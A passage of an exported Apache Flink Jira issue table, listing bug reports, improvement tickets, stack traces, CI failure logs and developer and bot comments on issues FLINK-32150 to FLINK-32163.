https://github.com/apache/flink-kubernetes-operator/blob/main/flink-kubernetes-operator/src/main/java/org/apache/flink/kubernetes/operator/metrics/lifecycle/LifecycleMetrics.java#L145",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Aug 11 06:54:17 UTC 2023,,,,,,,,,,"0|z1i35s:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"11/Aug/23 06:54;gyfora;merged to main 2e8bc6fa2c9d78764c8e5099954e3fd4fdd1b92f;;;",,,,,,,,,,,,,,,,,,,,,,
Support the same application run multiple jobs in HA mode,FLINK-32163,13537332,,New Feature,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,melin,melin,23/May/23 13:05,23/May/23 13:33,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,,,,,0,,,,Support the same application run multiple jobs in HA mode,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue May 23 13:33:24 UTC 2023,,,,,,,,,,"0|z1i348:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/May/23 13:33;martijnvisser;[~melin] The ticket is unclear for me. Looking at https://flink.apache.org/how-to-contribute/contribute-code/#1-create-jira-ticket-and-reach-consensus I think this first needs to be resolved on the Dev mailing list, before opening a Jira ticket.;;;",,,,,,,,,,,,,,,,,,,,,,
Misleading log message due to missing null check,FLINK-32162,13537321,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,chesnay,chesnay,chesnay,23/May/23 11:27,23/May/23 14:55,04/Jun/24 20:41,23/May/23 14:53,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,"Updating the job requirements always logs ""Failed to update requirements for job {}."" because we don't check whether the error is not null.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue May 23 14:53:58 UTC 2023,,,,,,,,,,"0|z1i31s:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/May/23 14:53;chesnay;master: fadde2a378aac4293676944dd513291919a481e3;;;",,,,,,,,,,,,,,,,,,,,,,
Migrate and remove some legacy ExternalResource,FLINK-32161,13537311,,Technical Debt,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Done,Weijie Guo,Weijie Guo,Weijie Guo,23/May/23 10:23,25/May/23 08:31,04/Jun/24 20:41,25/May/23 08:31,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,,,,,0,,,,"We currently have some implementations of {{ExternalResource}} that are easy to migrate to the {{Extension}} of Junt5, such as {{MultipartUploadResource}}. This ticket attempts to migrate parts of those and remove old implementations that are not being used.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu May 25 08:31:14 UTC 2023,,,,,,,,,,"0|z1i2zk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"24/May/23 09:47;chesnay;Can we get some clarification in here as to what this ticket is about?;;;","24/May/23 10:11;Weijie Guo;[~chesnay] Of course, I forgot to update the description information. I have added it now.;;;","25/May/23 08:31;Weijie Guo;master(1.18) via b783da3ead00dd9b7dc5fc1410ff5a63a1494e0e.;;;",,,,,,,,,,,,,,,,,,,,
CompactOperator cannot continue from checkpoint because of java.util.NoSuchElementException,FLINK-32160,13537276,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,mfi,mfi,23/May/23 07:31,24/May/23 07:16,04/Jun/24 20:41,,1.16.0,1.17.0,,,,,,,,,,,,,,,,,,,Connectors / FileSystem,,,,0,,,,"Hello :) We have a flink job (v 1.17) on k8s (using official flink-k8s-operator) that reads data from kafka and writes it to s3 using flink-sql using compaction. Job sometimes fails and continues from checkpoint just fine, but once a couple of days we experience a crash loop. Job cannot continue from the latest checkpoint and fails with such exception:
{noformat}
java.util.NoSuchElementException at java.base/java.util.ArrayList$Itr.next(Unknown Source)
 at org.apache.flink.connector.file.table.stream.compact.CompactOperator.initializeState(CompactOperator.java:114)
 at org.apache.flink.streaming.api.operators.StreamOperatorStateHandler.initializeOperatorState(StreamOperatorStateHandler.java:122)
 at org.apache.flink.streaming.api.operators.AbstractStreamOperator.initializeState(AbstractStreamOperator.java:274)
 at org.apache.flink.streaming.runtime.tasks.RegularOperatorChain.initializeStateAndOpenOperators(RegularOperatorChain.java:106)
 at org.apache.flink.streaming.runtime.tasks.StreamTask.restoreGates(StreamTask.java:734)
 at org.apache.flink.streaming.runtime.tasks.StreamTaskActionExecutor$1.call(StreamTaskActionExecutor.java:55)
 at org.apache.flink.streaming.runtime.tasks.StreamTask.restoreInternal(StreamTask.java:709)
 at org.apache.flink.streaming.runtime.tasks.StreamTask.restore(StreamTask.java:675)
 at org.apache.flink.runtime.taskmanager.Task.runWithSystemExitMonitoring(Task.java:952)
 at org.apache.flink.runtime.taskmanager.Task.restoreAndInvoke(Task.java:921)
 at org.apache.flink.runtime.taskmanager.Task.doRun(Task.java:745)
 at org.apache.flink.runtime.taskmanager.Task.run(Task.java:562)
 at java.base/java.lang.Thread.run(Unknown Source){noformat}
Here’s the relevant code: [https://github.com/apache/flink/blob/release-1.17/flink-connectors/flink-connector-files/src/main/java/org/apache/flink/connector/file/table/stream/compact/CompactOperator.java#L114]

It looks like `CompactOperator` is calling `next()` on iterator without checking `hasNext()` first - why's that? Is it a bug? Why `context.getOperatorStateStore().getListState(metaDescriptor)` returns empty iterator? Is latest checkpoint broken in such case? 
We have an identical job, but without compaction, and it works smoothly for a couple of weeks now. 

The whole job is just `select` from kafka and `insert` to s3.
{noformat}
CREATE EXTERNAL TABLE IF NOT EXISTS hive.`foo`.`bar` (  `foo_bar1` STRING,
  `foo_bar2` STRING,
  `foo_bar3` STRING,
  `foo_bar4` STRING
  )
  PARTITIONED BY (`foo_bar1` STRING, `foo_bar2` STRING, `foo_bar3` STRING)
  STORED AS parquet
  LOCATION 's3a://my/bucket/'
  TBLPROPERTIES (
    'auto-compaction' = 'true',
    'compaction.file-size' = '128MB',
    'sink.parallelism' = '8',
    'format' = 'parquet',
    'parquet.compression' = 'SNAPPY',
    'sink.rolling-policy.rollover-interval' = '1 h',
    'sink.partition-commit.policy.kind' = 'metastore'
  ){noformat}
Checkpoint configuration:
{noformat}
Checkpointing Mode Exactly Once
Checkpoint Storage FileSystemCheckpointStorage
State Backend HashMapStateBackend
Interval 20m 0s
Timeout 10m 0s
Minimum Pause Between Checkpoints 0ms
Maximum Concurrent Checkpoints 1
Unaligned Checkpoints Disabled
Persist Checkpoints Externally Enabled (retain on cancellation)
Tolerable Failed Checkpoints 0
Checkpoints With Finished Tasks Enabled
State Changelog Disabled{noformat}

Is there something wrong with given config or is this some unhandled edge case? 

Currently our workaround is to restart a job, without using checkpoint - it uses a state from kafka which in this case is fine","Flink 1.16/1.17 on k8s (flink-kubernetes-operator v.1.4.0), s3",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed May 24 07:16:22 UTC 2023,,,,,,,,,,"0|z1i2rs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/May/23 09:30;martijnvisser;[~lzljs3620320] Do you have any insights on this?;;;","24/May/23 06:31;luoyuxia;Is it a similar issue with FLINK-31689?;;;","24/May/23 07:16;mfi;Thanks [~luoyuxia] - it looks like the same exception. In my case parallelism does not change though;;;",,,,,,,,,,,,,,,,,,,,
Hudi Source throws NPE,FLINK-32159,13537269,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,Bo Cui,Bo Cui,23/May/23 06:45,18/Aug/23 22:35,04/Jun/24 20:41,,1.15.0,1.16.0,1.17.0,1.18.0,,,,,,,,,,,,,,,,,"Formats (JSON, Avro, Parquet, ORC, SequenceFile)",,,,0,auto-deprioritized-major,pull-request-available,,"spark/hive write hudi, and flink read hudi and job failed. because 

!image-2023-05-23-14-45-29-151.png!

 

The null judgment logic should be added to AbstractColumnReader#readToVector

https://github.com/apache/flink/blob/119b8c584dc865ee8a40a5c6410dddf8b36bac5a/flink-formats/flink-parquet/src/main/java/org/apache/flink/formats/parquet/vector/reader/AbstractColumnReader.java#LL155C19-L155C20",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/May/23 06:45;Bo Cui;image-2023-05-23-14-45-29-151.png;https://issues.apache.org/jira/secure/attachment/13058439/image-2023-05-23-14-45-29-151.png",,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Aug 18 22:35:07 UTC 2023,,,,,,,,,,"0|z1i2q8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","18/Aug/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,,,,,,,,,,,,,,
Unify the getMultiInputOperatorDefaultMeta and getOneInputOperatorDefaultMeta methods into the same getInputOperatorDefaultMeta method,FLINK-32158,13537248,,Improvement,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,jiaoqb,jiaoqb,23/May/23 02:38,17/Jul/23 09:57,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Table SQL / Planner,,,,0,pull-request-available,,,"Unify the getMultiInputOperatorDefaultMeta and getOneInputOperatorDefaultMeta methods into the same getInputOperatorDefaultMeta method. Because 1 is a special case of Multi, there is no need to repeat the definition.Same applies to getStateTtlForMultiInputOperator and getStateTtlForOneInputOperator methods",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-05-23 02:38:24.0,,,,,,,,,,"0|z1i2lk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Replaces LeaderConnectionInfo with LeaderInformation,FLINK-32157,13537202,13542119,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,bytesmith,mapohl,mapohl,22/May/23 16:43,13/Jul/23 14:30,04/Jun/24 20:41,13/Jul/23 14:29,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,starter,,{{LeaderConnectionInfo}} and {{LeaderInformation}} have the same purpose. {{LeaderInformation}} could substitute any occurrences of {{LeaderConnectionInfo}},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jul 13 14:29:36 UTC 2023,,,,,,,,,,"0|z1i2bc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Jul/23 02:42;bytesmith;hi [~mapohl] , i would like to address this issue, would you mind assigning it to me ?;;;","12/Jul/23 06:50;mapohl;Thanks for volunteering. I assigned the issue to you.;;;","13/Jul/23 14:29;mapohl;master: f37d41cf557e9acd113a063dbee442a3a92bf09e;;;",,,,,,,,,,,,,,,,,,,,
Int2AdaptiveHashJoinOperatorTest produced no output for 900s on AZP,FLINK-32156,13537156,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,Sergey Nuyanzin,Sergey Nuyanzin,22/May/23 11:22,18/Aug/23 22:35,04/Jun/24 20:41,,1.17.2,,,,,,,,,,,,,,,,,,,,Table SQL / Runtime,,,,0,auto-deprioritized-critical,test-stability,,"https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=48892&view=logs&j=a9db68b9-a7e0-54b6-0f98-010e0aff39e2&t=cdd32e0b-6047-565b-c58f-14054472f1be&l=10930
{noformat}
May 11 06:25:13 ==============================================================================
May 11 06:25:13 Process produced no output for 900 seconds.
May 11 06:25:13 ==============================================================================
...
May 11 06:25:14 ""main"" #1 prio=5 os_prio=0 tid=0x00007f672c00b800 nid=0x4b8 waiting on condition [0x00007f6735dbd000]
May 11 06:25:14    java.lang.Thread.State: RUNNABLE
May 11 06:25:14 	at org.apache.flink.table.runtime.util.UniformBinaryRowGenerator.next(UniformBinaryRowGenerator.java:90)
May 11 06:25:14 	at org.apache.flink.table.runtime.util.UniformBinaryRowGenerator.next(UniformBinaryRowGenerator.java:27)
May 11 06:25:14 	at org.apache.flink.runtime.operators.testutils.UnionIterator.next(UnionIterator.java:61)
May 11 06:25:14 	at org.apache.flink.table.runtime.operators.join.Int2HashJoinOperatorTestBase.joinAndAssert(Int2HashJoinOperatorTestBase.java:271)
May 11 06:25:14 	at org.apache.flink.table.runtime.operators.join.Int2HashJoinOperatorTestBase.buildJoin(Int2HashJoinOperatorTestBase.java:77)
May 11 06:25:14 	at org.apache.flink.table.runtime.operators.join.Int2AdaptiveHashJoinOperatorTest.testBuildFirstHashLeftOutJoinFallbackToSMJ(Int2AdaptiveHashJoinOperatorTest.java:114)
May 11 06:25:14 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
May 11 06:25:14 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
May 11 06:25:14 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
May 11 06:25:14 	at java.lang.reflect.Method.invoke(Method.java:498)
May 11 06:25:14 	at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:59)
May 11 06:25:14 	at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
May 11 06:25:14 	at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:56)

{noformat}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Aug 18 22:35:11 UTC 2023,,,,,,,,,,"0|z1i214:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Critical but is unassigned and neither itself nor its Sub-Tasks have been updated for 14 days. I have gone ahead and marked it ""stale-critical"". If this ticket is critical, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","18/Aug/23 22:35;flink-jira-bot;This issue was labeled ""stale-critical"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Critical, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,,,,,,,,,,,,,,
"Multiple CIs jobs failed due to ""Could not connect to azure.archive.ubuntu.com""",FLINK-32155,13537150,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,Sergey Nuyanzin,Sergey Nuyanzin,22/May/23 10:57,18/Aug/23 22:35,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Test Infrastructure,,,,0,auto-deprioritized-major,test-stability,,"The issue is very similar to https://issues.apache.org/jira/browse/FLINK-30921
the difference is that https://issues.apache.org/jira/browse/FLINK-30921 is for e2e jobs while this one is not

https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49065&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=37

https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49065&view=logs&j=4eda0b4a-bd0d-521a-0916-8285b9be9bb5&t=2ff6d5fa-53a6-53ac-bff7-fa524ea361a9&l=37

https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49065&view=logs&j=aa18c3f6-13b8-5f58-86bb-c1cffb239496&t=502fb6c0-30a2-5e49-c5c2-a00fa3acb203&l=37",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Aug 18 22:35:07 UTC 2023,,,,,,,,,,"0|z1i1zs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","18/Aug/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,,,,,,,,,,,,,,
Setup checkstyle rule to forbid mockito/powermock,FLINK-32154,13537147,13534279,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,22/May/23 10:35,24/May/23 14:12,04/Jun/24 20:41,24/May/23 14:12,,,,,,,,,,,,,,,1.18.0,,,,,,Build System,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed May 24 14:12:15 UTC 2023,,,,,,,,,,"0|z1i1z4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"24/May/23 14:12;chesnay;master: 24701ca4edf4d4cc93f7d59b04678b1eebedafa5;;;",,,,,,,,,,,,,,,,,,,,,,
Limit powermock to flink-core/-runtime,FLINK-32153,13537146,13534279,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,22/May/23 10:34,24/May/23 08:57,04/Jun/24 20:41,24/May/23 08:57,,,,,,,,,,,,,,,1.18.0,,,,,,Build System,Tests,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Wed May 24 08:57:06 UTC 2023,,,,,,,,,,"0|z1i1yw:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"24/May/23 08:57;chesnay;master: d8c64a808484cab78c8bd7b74a287edf7d1f3b01;;;",,,,,,,,,,,,,,,,,,,,,,
Consolidate mocking library usage,FLINK-32152,13537145,13534279,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,22/May/23 10:34,23/May/23 07:41,04/Jun/24 20:41,23/May/23 07:41,,,,,,,,,,,,,,,1.18.0,,,,,,Tests,,,,0,pull-request-available,,,"Use mockito instead of powermock wherever possible, with the goal of restricting powermock to specific modules, eventually dropping it entirely.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue May 23 07:41:59 UTC 2023,,,,,,,,,,"0|z1i1yo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/May/23 07:41;chesnay;master: 99add045846b0efcbf9a1c89db4132e1c99af4d4;;;",,,,,,,,,,,,,,,,,,,,,,
'Run kubernetes pyflink application test' fails while pulling image,FLINK-32151,13537144,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,Sergey Nuyanzin,Sergey Nuyanzin,22/May/23 10:23,19/Apr/24 12:35,04/Jun/24 20:41,,1.16.2,,,,,,,,,,,,,,,,,,,,API / Python,Deployment / Kubernetes,,,0,auto-deprioritized-major,test-stability,,"

{noformat}
2023-05-16T13:29:39.0614891Z May 16 13:29:39 Current logs for flink-native-k8s-pyflink-application-1-6f4c9bfc56-cstw7: 
2023-05-16T13:29:39.1253736Z Error from server (BadRequest): container ""flink-main-container"" in pod ""flink-native-k8s-pyflink-application-1-6f4c9bfc56-cstw7"" is waiting to start: image can't be pulled
2023-05-16T13:29:39.2611218Z May 16 13:29:39 deployment.apps ""flink-native-k8s-pyflink-application-1"" deleted
2023-05-16T13:29:39.4214711Z May 16 13:29:39 clusterrolebinding.rbac.authorization.k8s.io ""flink-role-binding-default"" deleted
2023-05-16T13:29:40.2644587Z May 16 13:29:40 pod/flink-native-k8s-pyflink-application-1-6f4c9bfc56-cstw7 condition met
2023-05-16T13:29:40.2664618Z May 16 13:29:40 Stopping minikube ...
2023-05-16T13:29:40.3396336Z May 16 13:29:40 * Stopping node ""minikube""  ...
2023-05-16T13:29:50.7499872Z May 16 13:29:50 * 1 node stopped.
{noformat}

it's very similar to https://issues.apache.org/jira/browse/FLINK-28226",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Apr 19 12:35:05 UTC 2024,,,,,,,,,,"0|z1i1yg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"22/May/23 10:23;Sergey Nuyanzin;CC [~hxbks2ks]  [~dianfu] ;;;","10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","18/Aug/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;","19/Apr/24 12:35;rskraba;1.20 e2e_1_c1 https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=59021&view=logs&j=bea52777-eaf8-5663-8482-18fbc3630e81&t=43ba8ce7-ebbf-57cd-9163-444305d74117&l=10878;;;",,,,,,,,,,,,,,,,,,,
ThreadDumpInfoTest crashed with exit code 239 on AZP (NoClassDefFoundError: org.jboss.netty.handler.codec.frame.LengthFieldBasedFrameDecoder),FLINK-32150,13537135,13537639,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Duplicate,,Sergey Nuyanzin,Sergey Nuyanzin,22/May/23 10:09,13/Jun/23 21:32,04/Jun/24 20:41,13/Jun/23 21:32,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / REST,Tests,,,0,test-stability,,,"https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49057&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=8572
{noformat}
May 16 12:03:24 12:03:24.449 [ERROR] org.apache.flink.runtime.rest.messages.ThreadDumpInfoTest
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.plugin.surefire.booterclient.ForkStarter.awaitResultsDone(ForkStarter.java:532)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.plugin.surefire.booterclient.ForkStarter.runSuitesForkOnceMultiple(ForkStarter.java:405)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.plugin.surefire.booterclient.ForkStarter.run(ForkStarter.java:321)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.plugin.surefire.booterclient.ForkStarter.run(ForkStarter.java:266)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.plugin.surefire.AbstractSurefireMojo.executeProvider(AbstractSurefireMojo.java:1314)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.plugin.surefire.AbstractSurefireMojo.executeAfterPreconditionsChecked(AbstractSurefireMojo.java:1159)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.plugin.surefire.AbstractSurefireMojo.execute(AbstractSurefireMojo.java:932)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo(DefaultBuildPluginManager.java:137)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.lifecycle.internal.MojoExecutor.doExecute2(MojoExecutor.java:370)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.lifecycle.internal.MojoExecutor.doExecute(MojoExecutor.java:351)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:215)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:171)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.lifecycle.internal.MojoExecutor.execute(MojoExecutor.java:163)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:117)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject(LifecycleModuleBuilder.java:81)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder.build(SingleThreadedBuilder.java:56)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.lifecycle.internal.LifecycleStarter.execute(LifecycleStarter.java:128)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:294)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.DefaultMaven.doExecute(DefaultMaven.java:192)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.DefaultMaven.execute(DefaultMaven.java:105)
May 16 12:03:24 12:03:24.449 [ERROR] 	at org.apache.maven.cli.MavenCli.execute(MavenCli.java:960)

{noformat}

also in logs 
{noformat}
12:01:08,340 [flink-akka.remote.default-remote-dispatcher-5] ERROR org.apache.flink.util.FatalExitExceptionHandler              [] - FATAL: Thread 'flink-akka.remote.default-remote-dispatcher-5' produced an uncaught exception. Stopping the process...
java.lang.NoClassDefFoundError: org/jboss/netty/handler/codec/frame/LengthFieldBasedFrameDecoder
        at akka.remote.transport.netty.NettyTransport.akka$remote$transport$netty$NettyTransport$$newPipeline(NettyTransport.scala:402) ~[flink-rpc-akka_40d517e5-dc06-423d-8404-00e8331e0610.jar:1.18-SNAPSHOT]
        at akka.remote.transport.netty.NettyTransport$$anon$4.getPipeline(NettyTransport.scala:454) ~[flink-rpc-akka_40d517e5-dc06-423d-8404-00e8331e0610.jar:1.18-SNAPSHOT]
        at org.jboss.netty.bootstrap.ClientBootstrap.connect(ClientBootstrap.java:206) ~[flink-rpc-akka_40d517e5-dc06-423d-8404-00e8331e0610.jar:1.18-SNAPSHOT]
